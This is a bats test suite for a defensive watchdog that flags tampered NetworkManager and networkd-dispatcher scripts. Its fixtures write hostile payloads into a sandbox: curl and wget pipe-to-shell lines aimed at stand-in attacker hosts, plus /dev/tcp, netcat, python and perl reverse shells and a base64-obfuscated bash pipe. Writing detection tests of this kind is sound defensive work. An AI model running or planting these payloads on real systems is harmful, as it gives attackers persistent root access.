#!/usr/bin/env bats
# L2 bats functional tests for the network-dispatcher-watchdog scan script.
#
# NetworkManager / networkd-dispatcher run every script in their dispatcher
# dirs AS ROOT on network events (interface up/down, connectivity change) —
# an event-triggered exec surface reachable by toggling a network. The
# watchdog flags a dispatcher script that is world-writable / non-root, or
# whose body carries a high-risk injection pattern (shared module-lib set).
#
# This module is SDD-061 D-6 migrated (sources module-lib), so it is also
# exercised for the fail-loud module_lib_missing path. Runs the actual scan
# script with `logger` shadowed on PATH and the dispatcher dir in a tmp
# sandbox via SELFDEF_NETDISP_DIRS.
#
# Run with: bats packaging/test/L2-network-dispatcher-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/systemd/network-dispatcher-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    DISPD="${TMP}/dispatcher.d"; mkdir -p "${DISPD}"
    SCRIPT="${DISPD}/10-benign"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_NETDISP_PROFILE="${PROFILE:-report}" \
    SELFDEF_NETDISP_BASELINE="${BASELINE}" \
    SELFDEF_NETDISP_DIRS="${DIRS:-$DISPD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dispatcher dirs → ok / no_dispatcher_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_dispatcher_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign dispatcher script, first run → ok / baseline_initial" {
    printf '#!/bin/sh\nip route show\nlogger "iface $1 $2"\n' > "${SCRIPT}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged scripts on second run → ok / network_dispatcher_intact" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — injection pattern in a dispatcher script
# ============================================================

@test "a dispatcher script with a curl|sh payload → alert / network_dispatcher_suspicious" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd                                   # benign baseline
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a dispatcher script with a /dev/tcp reverse shell → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a dispatcher script invoking a /tmp payload at command position → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\n/tmp/.payload --run\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign script change → warn / network_dispatcher_changed" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\nip addr show\n' > "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"network_dispatcher_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a benign dispatcher script is NOT flagged" {
    printf '#!/bin/sh\n# update resolv.conf on up\n[ "$2" = up ] && /usr/sbin/resolvconf -u\n' > "${SCRIPT}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on a suspicious script" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — dispatcher inventory enumerates network-event-trigger root-exec surface)" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (wget-pipe-sh in dispatcher): wget bootstrap → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in dispatcher): obfuscation → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (script under /var/tmp writable root): writable-root expansion" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\n/var/tmp/.payload --run\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable dispatcher script): script itself world-writable → alert" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    chmod 0666 "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable dispatcher script): group-writable → alert above world-writable bar" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    chmod 0664 "${SCRIPT}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable script): baseline_initial fires alert at install-time" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    chmod 0666 "${SCRIPT}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-network-dispatcher -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): network-dispatcher-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # Network-event-triggered root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD}/99-evil"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"network_dispatcher_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# example attack: curl http://evil/x | sh\nip route show\n' > "${SCRIPT}"
    run_wd
    ! cap | grep -q '"event":"network_dispatcher_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: NetworkManager + networkd-dispatcher + ifupdown axes — injection in ANY → alert)" {
    DISPD2="${TMP}/ifupdown.d"; mkdir -p "${DISPD2}"
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    DIRS="${DISPD} ${DISPD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${DISPD2}/99-evil-ifupdown"
    DIRS="${DISPD} ${DISPD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in network-dispatcher script: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. NetworkManager dispatcher scripts run
    # AS ROOT on every network state change (up/down/dhcp4-change/
    # pre-up/pre-down/etc.) — a recurring trigger that fires
    # multiple times per network blip. Sister-vector to dhcpcd-
    # hooks/dhclient-hooks/resolvconf-hooks on the network-event
    # family. Closes the netcat axis on the network-dispatcher
    # surface (T1546 — Event Triggered Execution via network state
    # change).
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on network-dispatcher script surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the network-
    # event-trigger root-exec persistence surface (T1546 —
    # network-dispatcher scripts run AS ROOT on every network
    # state change; recurring trigger fires multiple times per
    # network blip).
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on network-dispatcher script surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp network-
    # dispatcher rev-shell variants. Perl on every Debian/Ubuntu
    # host. Locks perl axis on T1546 network-event-trigger root-
    # exec persistence — runs AS ROOT on every network state
    # change.
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: network-dispatcher script invoking binary from /dev/shm → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. Beyond
    # inline reverse-shell payloads, attackers stage benign-
    # looking network-dispatcher scripts that invoke a binary
    # in writable-root (T1546 network-event-trigger root-exec —
    # runs AS ROOT on every network state change; recurring
    # trigger fires multiple times per network blip). /dev/shm
    # is the tmpfs in-RAM writable-root that survives no on-
    # disk forensic trace.
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/dev/shm/staged_payload\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: network-dispatcher script invoking binary from /var/tmp → alert)" {
    # Sister to /dev/shm net-dispatcher writable-root-exec. /var/tmp
    # persistent + writable.
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/var/tmp/staged_payload\n' > "${DISPD}/99-evil"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on network-dispatcher surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The network-dispatcher-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and
    # the operator never sees the T1546 network-state-change
    # root-exec persistence alert. Locks parser contract on the
    # network-dispatcher detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${DISPD}/99-evil"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # network-dispatcher-watchdog runs ON the timer's scheduled
    # fire — scans /etc/NetworkManager/dispatcher.d for
    # injection patterns, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the network-dispatcher-
    # watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/systemd/selfdef-network-dispatcher.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. network-dispatcher-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # network-dispatcher-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # network-dispatcher-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'network-dispatcher-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: network-dispatcher-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. network-dispatcher-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the network-dispatcher-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (network-dispatcher-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the network-dispatcher-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/network-dispatcher-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
